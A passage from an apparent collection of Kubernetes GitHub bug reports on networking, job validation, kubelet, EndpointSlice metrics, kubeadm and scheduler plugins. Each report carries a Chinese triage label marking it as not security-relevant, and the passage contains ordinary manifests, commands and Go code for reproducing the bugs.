We'd like to have conntrack reconciler for Services in kube-proxy, for each Service or Endpoint change it should reconcile the Service/Endpoint table with the existing conntrack table and remove stale UDP entries (we have concluded in other issues that UDP is the only protocol that requires this)

#### Why is this needed?

Despite a lot of work and testing was added to solve the problem with stale UDP entries that can blackhole traffic, we still have reports of issues related to UDP stale entries

https://github.com/kubernetes/kubernetes/issues/125467

Also, the conntrack logic is event based and, as expected, if something fails it never reconciles

https://github.com/kubernetes/kubernetes/issues/112604

The reconciler will only delete the entries that are known to be stale, other entries will time out.

#### References

Some WIP I had https://github.com/kubernetes/kubernetes/compare/master...aojea:kubernetes:conntrack_done_right?expand=1

#### Related issues that will be fixed

- https://github.com/kubernetes/kubernetes/issues/125979
- https://github.com/kubernetes/kubernetes/issues/125467
- https://github.com/kubernetes/kubernetes/issues/122740


### 分析结果

不涉及

---

## Issue #126065 Can only access pod nodePort accessible only from the node where the pod is running

- Issue 链接：[#126065](https://github.com/kubernetes/kubernetes/issues/126065)

### Issue 内容

#### What happened?

I built a brand new Kubernetes cluster on Rocky 9 with one control-plane and two workers. I deployed a sample Nginx deployment and service which serves a simple index.html page on port 30081 using a nodePort in the service file. I can curl the node that is running the pod and see the index.html, but not the other two. The issue moves around when draining nodes to move the pod around. Firewalld is disabled on all 3 nodes.

#### What did you expect to happen?

I expected to be able to curl mynode1:30081 or mynode2:30081 and get an answer, not just mynode3:30081 where the pod is located.

#### How can we reproduce it (as minimally and precisely as possible)?

Build a new Kubernetes cluster on Rocky 9, deploy Flannel CNI, deploy the following service and deployment.

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx
spec:
  replicas: 2
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx
        ports:
        - containerPort: 80
        volumeMounts:
        - name: nginx-html
          mountPath: /usr/share/nginx/html/index.html
          subPath: index.html
      volumes:
      - name: nginx-html
        configMap:
          name: nginx-demo
          items:
          - key: index.html
            path: index.html
```

```
apiVersion: v1
kind: Service
metadata:
  name: nginx-service
  labels:
    app: nginx
spec:
  selector:
    app: nginx
  ports:
    - protocol: TCP
      port: 80
      targetPort: 80
      nodePort: 30081
  type: NodePort
  externalTrafficPolicy: Cluster
```

#### Anything else we need to know?

/etc/sysctl.d/k8s.conf
```
net.bridge.bridge-nf-call-iptables  = 1
net.bridge.bridge-nf-call-ip6tables = 1
net.ipv4.ip_forward                 = 1
```



#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
```

</details>


#### Cloud provider

<details>
On-prem vSphere.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Rocky Linux"
VERSION="9.4 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.4"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Rocky Linux 9.4 (Blue Onyx)"
ANSI_COLOR="0;32"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:rocky:rocky:9::baseos"
HOME_URL="https://rockylinux.org/"
BUG_REPORT_URL="https://bugs.rockylinux.org/"
SUPPORT_END="2032-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-9"
ROCKY_SUPPORT_PRODUCT_VERSION="9.4"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.4"
$ uname -a
Linux kube1-dev.home.REDACTED.io 5.14.0-427.22.1.el9_4.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Jun 19 17:35:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
Deployed with my own Salt state. 
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
Flannel 0.25.4.
</details>


### 分析结果

不涉及

---

## Issue #126040 JobTemplate validation bug: OnExitCodes should be an optional field for PodFailurePolicyRule

- Issue 链接：[#126040](https://github.com/kubernetes/kubernetes/issues/126040)

### Issue 内容

#### What happened?

[OnExitCodes field should be optional](https://github.com/kubernetes/kubernetes/blob/60862c98a4c0bcbc351b076714108d364883b5f7/staging/src/k8s.io/api/batch/v1/types.go#L238) for a PodFailurePolicyRule. 

However, when trying to create a JobSet programmatically with a JobTemplate that defines a PodFailurePolicy rule for failing a job immediately if the failed pod had condition DisruptionTarget, I get a validation error indicating that `OnExitCodes` cannot be null. I've tried using both `k8s.io/api v0.29.4` and `k8s.io/api v0.30.2` (with matching versions for k8s.io/apimachinery package as well).

Error:
```
$ k apply -f examples/simple/failure-policy.yaml 
The JobSet "failurepolicy" is invalid: 
* spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[0].onExitCodes: Invalid value: "null": spec.replicatedJobs[0].template.spec.podFailurePolicy.rules[0].onExitCodes in body must be of type object: "null"
* <nil>: Invalid value: "null": some validation rules were not checked because the object was invalid; correct the existing errors to complete validation
```

JobSet spec:

```yaml
apiVersion: jobset.x-k8s.io/v1alpha2
kind: JobSet
metadata:
  name: failurepolicy
spec:
  replicatedJobs:
  - name: leader
    replicas: 1
    template:
      spec:
        # Set backoff limit to 0 so job will immediately fail if any pod fails.
        backoffLimit: 0
        completions: 2
        parallelism: 2
        template:
          spec:
            restartPolicy: Never
            containers:
            - name: leader
              image: bash:latest
              command:
              - bash
              - -xc
              - |
                for i in $(seq 1 1000)
                do
                  echo "$i"
                  sleep 1
                done
        podFailurePolicy:
          rules:
          - action: FailJob
            onPodConditions:
            - type: DisruptionTarget
```

#### What did you expect to happen?

JobTemplate passes validation.

#### How can we reproduce it (as minimally and precisely as possible)?

#### Repro steps using k8s.io/api v0.29.4

1. Install JobSet:

```VERSION=v0.5.2
kubectl apply --server-side -f https://github.com/kubernetes-sigs/jobset/releases/download/$VERSION/manifests.yaml
```

2. Try applying example JobSet in the description of this issue.

```kubectl apply -f jobset-from-github-issue.yaml```


#### Repro steps using k8s.io/api v0.30.2

1. Clone JobSet: `git clone https://github.com/kubernetes-sigs/jobset`
2. Upgrade k8s.io/api and k8s.io/apimachinery

```
go get -u k8s.io/api
go get -u k8s.io/apimachinery
go mod tidy
```

3. Try applying example JobSet in the description of this issue.

```kubectl apply -f jobset-from-github-issue.yaml```


#### Anything else we need to know?

_No response_

#### Kubernetes version

1.30 (tests on a kind cluster using kindest/node:v1.30.0)

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126021 Remove Mirror pod from manifests won't retry if process failed

- Issue 链接：[#126021](https://github.com/kubernetes/kubernetes/issues/126021)

### Issue 内容

#### What happened?

1、Remove a static pod file from /etc/kubernetes/manifests
2、The podWorker termination process encounter an error (CRI KillPodSandboxError .etc)
3、The termination stucks and never retry. (Leaves the sandbox running still and block the same static pod to recreate later)

#### What did you expect to happen?

The completion of termination process to be guaranteed (Do a retry if failed .etc)

#### How can we reproduce it (as minimally and precisely as possible)?

How I reproduce it:
1、Inject error in `kuberuntime_manager.go` 
![image](https://github.com/user-attachments/assets/affbb315-d7e4-4263-beb8-b1faf50f6d20)
2、echo kube-scheduler's sandbox id in `/root/FAIL_TO_KILL_SANDBOX`
3、move `/etc/kubernetes/kube-scheduler.yaml`  to `/root/`



#### Anything else we need to know?

The overall process of removing a static pod within kubelet is like:
![image](https://github.com/kubernetes/kubernetes/assets/33858397/a580a2ba-3fd8-4fec-a5e6-1c209cdfa6a7)


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3+25c04d0797b8de-dirty", GitCommit:"25c04d0797b8de26ae4719418cb2c120596b57d7", GitTreeState:"dirty", BuildDate:"2024-07-10T17:19:18Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/arm64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3+25c04d0797b8de-dirty", GitCommit:"25c04d0797b8de26ae4719418cb2c120596b57d7", GitTreeState:"dirty", BuildDate:"2024-07-10T17:16:40Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/arm64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126004 Incorrect endpoint slice metrics for dualstack services

- Issue 链接：[#126004](https://github.com/kubernetes/kubernetes/issues/126004)

### Issue 内容

#### What happened?

When deploying a dualstack service, endpointslices for both IP families will be created. The endpoint slice metrics reported are only 1 of the 2 IP Families. `endpoint_slice_controller_desired_endpoint_slices` and `endpoint_slice_controller_num_endpoint_slices` reports only the endpoint slices of 1 IP family and `endpoint_slice_controller_endpoints_desired` reports only the endpoints of 1 IP Family.

For example, let's say 2 pods are selected by a dualstack service, 2 endpoint slices will be created (1 for IPv4 and i for IPv6), `endpoint_slice_controller_desired_endpoint_slices` and `endpoint_slice_controller_num_endpoint_slices` will be increased by 1 (instead of 2) and `endpoint_slice_controller_endpoints_desired` will be increased by 2 (instead of 4 (2 pods and 2 IPs per pod)).

#### What did you expect to happen?

Using Dualstack service, the metrics reported by the endpointslice controller should reflect the correct amount the endpoint slices created with the correct amount of endpoints.

#### How can we reproduce it (as minimally and precisely as possible)?

In the details below, I added some instructions to access the metrics for the controller-manager in KinD.
<details>

Dualstack KinD configuration:
```
---
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
networking:
  ipFamily: dual
nodes:
- role: control-plane
  image: kindest/node:v1.30.0@sha256:047357ac0cfea04663786a612ba1eaba9702bef25227a794b52890dd8bcd692e
- role: worker
  image: kindest/node:v1.30.0@sha256:047357ac0cfea04663786a612ba1eaba9702bef25227a794b52890dd8bcd692e
```

Allow anonymous users to access metrics:
```
cat <<EOF | kubectl apply -f -
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: anonymous-metrics-reader
rules:
- nonResourceURLs: ["/metrics"]
  verbs: ["get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-metrics-reader
subjects:
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: anonymous-metrics-reader
  apiGroup: rbac.authorization.k8s.io
EOF
```

Expose the controller-manager metrics:
```
kubectl port-forward kube-controller-manager-kind-control-plane -n kube-system 10257:10257
```

</details>

For reference, Get `endpoint_slice_controller_desired_endpoint_slices` from the kube-controller-manager metrics:
```
$ curl -ks https://localhost:10257/metrics | grep endpoint_slice_controller_desired_endpoint_slices
# HELP endpoint_slice_controller_desired_endpoint_slices [ALPHA] Number of EndpointSlices that would exist with perfect endpoint allocation
# TYPE endpoint_slice_controller_desired_endpoint_slices gauge
endpoint_slice_controller_desired_endpoint_slices 1
```

For reference, List the EndpointSlices:
```
$ kubectl get endpointslices --all-namespaces
NAMESPACE     NAME                 ADDRESSTYPE   PORTS        ENDPOINTS               AGE
default       kubernetes           IPv4          6443         172.18.0.2              16m
kube-system   kube-dns-82glk       IPv4          9153,53,53   10.244.0.3,10.244.0.4   16m
```

Deploy a dualstack service:
```
cat <<EOF | kubectl apply -f -
---
apiVersion: v1
kind: Service
metadata:
  name: demo-service
spec:
  ipFamilies:
    - IPv4
    - IPv6
  ipFamilyPolicy: "RequireDualStack"
  selector:
    app: demo-pod
  type: ClusterIP
  ports:
    - protocol: TCP
      port: 5000
      targetPort: 5000
EOF
```

Get `endpoint_slice_controller_desired_endpoint_slices` from the kube-controller-manager metrics:
```
$ curl -ks https://localhost:10257/metrics | grep endpoint_slice_controller_desired_endpoint_slices
# HELP endpoint_slice_controller_desired_endpoint_slices [ALPHA] Number of EndpointSlices that would exist with perfect endpoint allocation
# TYPE endpoint_slice_controller_desired_endpoint_slices gauge
endpoint_slice_controller_desired_endpoint_slices 2
```

List the EndpointSlices:
```
$ kubectl get endpointslices --all-namespaces
NAMESPACE     NAME                 ADDRESSTYPE   PORTS        ENDPOINTS               AGE
default       demo-service-7pplq   IPv4          <unset>      <unset>                 7m47s
default       demo-service-km7tq   IPv6          <unset>      <unset>                 7m47s
default       kubernetes           IPv4          6443         172.18.0.2              16m
kube-system   kube-dns-82glk       IPv4          9153,53,53   10.244.0.3,10.244.0.4   16m
```

I think `kubernetes` EndpointSlice is not counted as it is not managed by the endpointslice controller of the controller manager (It doesn't have the `endpointslice.kubernetes.io/managed-by: endpointslice-controller.k8s.io` label).

As observed here, 2 endpoint slices have been created (1 IPv4 and 1 IPv6), but the `endpoint_slice_controller_desired_endpoint_slices` has increased by 1.

#### Anything else we need to know?

This has been spotted during the review of the dualstack service implementation: https://github.com/kubernetes/kubernetes/pull/91824/files#r511160829

When we create a Dualstack service, the [reconcileByAddressType](https://github.com/kubernetes/endpointslice/blob/v0.30.2/reconciler.go#L147) function is called twice (1 IPv4, 1 IPv6), PortCache is created twice for the same service and the metrics cache is updated twice with the same key (ServiceNM) here: [kubernetes/endpointslice/reconciler.go#L265](https://github.com/kubernetes/endpointslice/blob/v0.30.2/reconciler.go#L265). Since the same key is used, the second iteration in `reconcileByAddressType` will overwrite the first one, so metrics will not be correctly reported (metrics for 1 IP Family will be missing). The PortCache could be used in the main `Reconcile` function and the address type could be used as prefix when calling `Set` for the PortCache here: [kubernetes/endpointslice/reconciler.go#L227](https://github.com/kubernetes/endpointslice/blob/v0.30.2/reconciler.go#L227).

The EndpointSlice Mirroring reconciler uses the same concept with the metrics cache, but use the same PortCache for all IP families and uses the IP Family has prefix for the key ([pkg/controller/endpointslicemirroring/utils.go#L40](https://github.com/kubernetes/kubernetes/blob/v1.30.2/pkg/controller/endpointslicemirroring/utils.go#L40)), so the problem does not exist in this reconciler.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125992 [kubelet-check] Initial timeout of 40s passed

- Issue 链接：[#125992](https://github.com/kubernetes/kubernetes/issues/125992)

### Issue 内容

#### What happened?

Unfortunately, an error has occurred:
        timed out waiting for the condition

This error is likely caused by:
        - The kubelet is not running
        - The kubelet is unhealthy due to a misconfiguration of the node in some way (required cgroups disabled)

If you are on a systemd-powered system, you can try to troubleshoot the error with the following commands:
        - 'systemctl status kubelet'
        - 'journalctl -xeu kubelet'

Additionally, a control plane component may have crashed or exited when started by the container runtime.
To troubleshoot, list all containers using your preferred container runtimes CLI, e.g. docker.
Here is one example how you may list all Kubernetes containers running in docker:
        - 'docker ps -a | grep kube | grep -v pause'
        Once you have found the failing container, you can inspect its logs with:
        - 'docker logs CONTAINERID'
error execution phase wait-control-plane: couldn't initialize a Kubernetes cluster
To see the stack trace of this error execute with --v=5 or higher
![ks集群master](https://github.com/kubernetes/kubernetes/assets/19323303/2d28901f-6058-4614-9217-4a900aac2f08)
![k8s集群error](https://github.com/kubernetes/kubernetes/assets/19323303/670a92f1-c873-4318-b597-9daf439baf6d)


#### What did you expect to happen?

I hope someone can help solve this problem

#### How can we reproduce it (as minimally and precisely as possible)?

I hope someone can help solve this problem

#### Anything else we need to know?

I hope someone can help solve this problem

#### Kubernetes version

<details>

```console
$ kubectl version 1.17.3
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
[kubelet-check] Initial timeout of 40s passed.

Unfortunately, an error has occurred:
        timed out waiting for the condition

This error is likely caused by:
        - The kubelet is not running
        - The kubelet is unhealthy due to a misconfiguration of the node in some way (required cgroups disabled)

If you are on a systemd-powered system, you can try to troubleshoot the error with the following commands:
        - 'systemctl status kubelet'
        - 'journalctl -xeu kubelet'

Additionally, a control plane component may have crashed or exited when started by the container runtime.
To troubleshoot, list all containers using your preferred container runtimes CLI, e.g. docker.
Here is one example how you may list all Kubernetes containers running in docker:
        - 'docker ps -a | grep kube | grep -v pause'
        Once you have found the failing container, you can inspect its logs with:
        - 'docker logs CONTAINERID'
error execution phase wait-control-plane: couldn't initialize a Kubernetes cluster
To see the stack trace of this error execute with --v=5 or higher


```
</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
docker
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125948 my sheduler plugin can not reject pod

- Issue 链接：[#125948](https://github.com/kubernetes/kubernetes/issues/125948)

### Issue 内容

#### What happened?

```
package plugin

import (
	"context"
	"fmt"

	v1 "k8s.io/api/core/v1"
	"k8s.io/kubernetes/pkg/scheduler/framework"
	"k8s.io/apimachinery/pkg/runtime"
)

// MyPreEnqueuePlugin is a plugin that implements the PreEnqueue extension point.
type MyPreEnqueuePlugin struct {
	handle framework.Handle
}

// Name returns the name of the plugin. It is used in logs, etc.
func (p *MyPreEnqueuePlugin) Name() string {
	return "MyPreEnqueuePlugin"
}

// PreEnqueue is the function that is called before a pod is enqueued.
func (p *MyPreEnqueuePlugin) PreEnqueue(ctx context.Context, pod *v1.Pod) *framework.Status {
	// Add your plugin logic here
	fmt.Printf("PreEnqueue logic for Pod: %s/%s\n", pod.Namespace, pod.Name)
	// For example, reject all pods with a specific label
	if pod.Labels["reject"] == "true" {
		return framework.NewStatus(framework.Unschedulable, "Pod has reject label")
	}
	return framework.NewStatus(framework.Success)
}

// New initializes a new plugin and returns it.
func New(_ runtime.Object, h framework.Handle) (framework.Plugin, error) {
	return &MyPreEnqueuePlugin{
		handle: h,
	}, nil
}

var _ framework.PreEnqueuePlugin = &MyPreEnqueuePlugin{}
```

```
---
# Source: scheduler-plugins/templates/serviceaccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: default-scheduler
  namespace: kube-system
---
# Source: scheduler-plugins/templates/configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: scheduler-config
  namespace: kube-system
data:
  scheduler-config.yaml: |
    apiVersion: kubescheduler.config.k8s.io/v1
    kind: KubeSchedulerConfiguration
    profiles:
      - schedulerName: default-scheduler
        plugins:
          preEnqueue:
            enabled:
              - name: MyPreEnqueuePlugin
---
# Source: scheduler-plugins/templates/rbac.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: default-scheduler
rules:
- apiGroups: [""]
  resources: ["namespaces"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["", "events.k8s.io"]
  resources: ["events"]
  verbs: ["create", "patch", "update"]
- apiGroups: ["coordination.k8s.io"]
  resources: ["leases"]
  verbs: ["create"]
- apiGroups: ["coordination.k8s.io"]
  resourceNames: ["kube-scheduler"]
  resources: ["leases"]
  verbs: ["get", "update"]
- apiGroups: [""]
  resources: ["endpoints"]
  verbs: ["create"]
- apiGroups: [""]
  resourceNames: ["kube-scheduler"]
  resources: ["endpoints"]
  verbs: ["get", "update"]
- apiGroups: [""]
  resources: ["nodes"]
  verbs: ["get", "list", "watch", "patch"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["delete", "get", "list", "watch", "update", patch]
- apiGroups: [""]
  resources: ["bindings", "pods/binding"]
  verbs: ["create"]
- apiGroups: [""]
  resources: ["pods/status"]
  verbs: ["patch", "update"]
- apiGroups: [""]
  resources: ["replicationcontrollers", "services"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps", "extensions"]
  resources: ["replicasets"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["statefulsets"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["policy"]
  resources: ["poddisruptionbudgets"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["persistentvolumeclaims", "persistentvolumes"]
  verbs: ["get", "list", "watch", "patch", "update"]
- apiGroups: ["authentication.k8s.io"]
  resources: ["tokenreviews"]
  verbs: ["create"]
- apiGroups: ["authorization.k8s.io"]
  resources: ["subjectaccessreviews"]
  verbs: ["create"]
- apiGroups: ["storage.k8s.io"]
  resources: ["csinodes", "storageclasses" , "csidrivers" , "csistoragecapacities"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["topology.node.k8s.io"]
  resources: ["noderesourcetopologies"]
  verbs: ["get", "list", "watch"]
---
# Source: scheduler-plugins/templates/rbac.yaml
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: default-scheduler
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: default-scheduler
subjects:
- kind: ServiceAccount
  name: default-scheduler
  namespace: kube-system
---
# Source: scheduler-plugins/templates/rbac.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: sched-plugins::extension-apiserver-authentication-reader
  namespace: kube-system
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: extension-apiserver-authentication-reader
subjects:
- kind: ServiceAccount
  name: default-scheduler
  namespace: kube-system
---
# Source: scheduler-plugins/templates/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    component: scheduler
  name: default-scheduler
  namespace: kube-system
spec:
  selector:
    matchLabels:
      component: scheduler
  replicas: 1
  template:
    metadata:
      labels:
        component: scheduler
    spec:
      serviceAccountName: default-scheduler
      containers:
      - command:
        - /bin/my-scheduler
        - --config=/etc/kubernetes/scheduler-config.yaml
        - --v=2
        image: registry.cn-hangzhou.aliyuncs.com/hxpdocker/my-scheduler:v1
        imagePullPolicy: Always  
        livenessProbe:
          httpGet:
            path: /healthz
            port: 10259
            scheme: HTTPS
          initialDelaySeconds: 15
        name: scheduler-plugins-scheduler
        readinessProbe:
          httpGet:
            path: /healthz
            port: 10259
            scheme: HTTPS
        resources:
          requests:
            cpu: '0.1'
        securityContext:
          privileged: false
        volumeMounts:
        - name: scheduler-config
          mountPath: /etc/kubernetes
          readOnly: true
      hostNetwork: false
      hostPID: false
      volumes:
      - name: scheduler-config
        configMap:
          name: scheduler-config
```

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
        reject: "true"
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
```

[root@k8s-master02 ~]# kubectl get pod
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-69d78fb87d-25k68   1/1     Running   0          37s
nginx-deployment-69d78fb87d-rm59m   1/1     Running   0          37s
nginx-deployment-69d78fb87d-tgsmg   1/1     Running   0          37s

with log 
PreEnqueue logic for Pod: default/nginx-deployment-69d78fb87d-tgsmg
PreEnqueue logic for Pod: default/nginx-deployment-69d78fb87d-25k68
PreEnqueue logic for Pod: default/nginx-deployment-69d78fb87d-rm59m



#### What did you expect to happen?

reject pod 

#### How can we reproduce it (as minimally and precisely as possible)?

apply the yaml

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
[root@k8s-master02 ~]# kubectl version
Client Version: v1.29.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.0

</details>


#### Cloud provider

<details>
vmware workstationo
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125942 sample-apiserver lacks RBAC permissions

- Issue 链接：[#125942](https://github.com/kubernetes/kubernetes/issues/125942)

### Issue 内容

#### What happened?

Deployed sample-apiserver into a kind cluster following the instructions in https://github.com/kubernetes/sample-apiserver/blob/master/README.md. 

Checked wardle-server pod logs, found the following error:
```
$ k logs wardle-server-5669dcc765-nxkdt -n wardle | grep -i unhandled
Defaulted container "wardle-server" out of: wardle-server, etcd
E0707 20:25:33.179224       1 reflector.go:158] "Unhandled Error" err="pkg/mod/k8s.io/client-go@v0.0.0-20240707023231-354ed1bc9f1f/tools/cache/reflector.go:243: Failed to watch *v1.ValidatingAdmissionPolicyBinding: failed to list *v1.ValidatingAdmissionPolicyBinding: validatingadmissionpolicybindings.admissionregistration.k8s.io is forbidden: User \"system:serviceaccount:wardle:apiserver\" cannot list resource \"validatingadmissionpolicybindings\" in API group \"admissionregistration.k8s.io\" at the cluster scope"
E0707 20:25:33.179839       1 reflector.go:158] "Unhandled Error" err="pkg/mod/k8s.io/client-go@v0.0.0-20240707023231-354ed1bc9f1f/tools/cache/reflector.go:243: Failed to watch *v1.ValidatingAdmissionPolicy: failed to list *v1.ValidatingAdmissionPolicy: validatingadmissionpolicies.admissionregistration.k8s.io is forbidden: User \"system:serviceaccount:wardle:apiserver\" cannot list resource \"validatingadmissionpolicies\" in API group \"admissionregistration.k8s.io\" at the cluster scope"
...
```

#### What did you expect to happen?

No such errors. 

#### How can we reproduce it (as minimally and precisely as possible)?

Deployed sample-apiserver into a kind cluster following the instructions in https://github.com/kubernetes/sample-apiserver/blob/master/README.md. 

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
```

</details>


#### Cloud provider

KIND

### 分析结果

不涉及

---

## Issue #125938 Unable to deploy sample-apiserver: emulation version 1.32 is not between [1.30, 1.31.0]

- Issue 链接：[#125938](https://github.com/kubernetes/kubernetes/issues/125938)

### Issue 内容

#### What happened?

Following the instructions in https://github.com/kubernetes/sample-apiserver/blob/master/README.md:
1. Built the sample-apiserver image using the tip of the master branch (dd24c9e2a45c5d0eb7a98a2246906f6e2ec7c0e7)
2. Deployed the sample-apiserver image into a kind cluster.

The deployment failed with
```
$ k logs wardle-server-65dbc6f5d-9pwv4 -n wardle
Defaulted container "wardle-server" out of: wardle-server, etcd
I0707 11:16:37.994750       1 registry.go:379] setting wardle:feature gate emulation version to 1.2
I0707 11:16:37.997302       1 registry.go:379] setting kube:feature gate emulation version to 1.32
I0707 11:16:37.997370       1 feature_gate.go:522] set feature gate emulationVersion to 1.32
I0707 11:16:37.998443       1 plugins.go:83] "Registered admission plugin" plugin="BanFlunder"
E0707 11:16:38.001481       1 run.go:72] "command failed" err="emulation version 1.32 is not between [1.30, 1.31.0]"
```

#### What did you expect to happen?

Deployment succeeds. 

#### How can we reproduce it (as minimally and precisely as possible)?

```bash
git clone https://github.com/kubernetes/sample-apiserver.git
cd sample-apiserver
IMAGE=...
podman build -t $IMAGE ./artifacts/simple-image
podman push $IMAGE
# Adjust deployment.yaml to use the image built previously, then apply the manifests
kubectl apply -f artifacts/example
```

Now check pods in the wardle namespace. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
```

</details>


#### Cloud provider

KIND. 

### 分析结果

不涉及

---

## Issue #125937 do we have NormalizeScorePlugin plugin for scheduler

- Issue 链接：[#125937](https://github.com/kubernetes/kubernetes/issues/125937)

### Issue 内容

#### What happened?

```
package plugin

import (
    "context"
    "fmt"
    "k8s.io/kubernetes/pkg/scheduler/framework"
     "k8s.io/apimachinery/pkg/runtime"
)

// NormalizeScorePlugin is a normalize score plugin.
type MyNormalizeScorePlugin struct {
    handle framework.Handle
}

// Name returns the name of the plugin.
func (p *MyNormalizeScorePlugin) Name() string {
    return "MyNormalizeScorePlugin"
}

// NormalizeScore normalizes the scores to a range of 0 to 100.
func (p *MyNormalizeScorePlugin) NormalizeScore(ctx context.Context, state *framework.CycleState, pod *framework.PodInfo, scores framework.NodeScoreList) *framework.Status {
    fmt.Printf("before NormalizeScore score %s \n", scores)
    var maxScore, minScore int64 = -1, -1
    for _, score := range scores {
        if maxScore == -1 || score.Score > maxScore {
            maxScore = score.Score
        }
        if minScore == -1 || score.Score < minScore {
            minScore = score.Score
        }
    }

    if maxScore == minScore {
        for i := range scores {
            scores[i].Score = 100
        }
    } else {
        for i := range scores {
            scores[i].Score = 100 * (scores[i].Score - minScore) / (maxScore - minScore)
        }
    }
    fmt.Printf("after NormalizeScore score %s \n", scores)
    return framework.NewStatus(framework.Success, "")
}

// New initializes a new plugin and returns it.
func New(_ runtime.Object, handle framework.Handle) (framework.Plugin, error) {
    return &MyNormalizeScorePlugin{
        handle: handle,
    }, nil
}

var _ framework.NormalizeScorePlugin = &MyNormalizeScorePlugin{}
```

plugin/plugin.go:53:17: undefined: framework.NormalizeScorePlugin

